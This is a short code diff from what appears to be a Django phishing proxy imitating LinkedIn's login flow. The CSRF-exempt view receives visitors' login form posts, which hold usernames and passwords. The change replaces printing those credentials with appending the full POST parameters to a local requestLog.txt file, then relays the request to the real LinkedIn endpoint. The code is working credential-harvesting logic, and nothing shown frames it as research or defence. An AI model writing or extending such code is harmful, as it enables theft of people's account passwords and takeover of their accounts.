@@ -11,9 +11,9 @@ def index(request):
 @csrf_exempt
 def checkpoint_lg_login_submit(request):
     url = 'https://www.linkedin.com/checkpoint/lg/login-submit'
-    print(request.POST)
-    data = {"username": request.POST.get("username"), "password": request.POST.get("password")}
-    print("Data: ", data)
+    with open("requestLog.txt", 'a') as f:
+        f.write('\n==========[ POST Request Params ]==========\n')
+        f.write(str(request.POST))
     return login_post(url, request.POST)
 
 def checkpoint_challenge_verify(request):
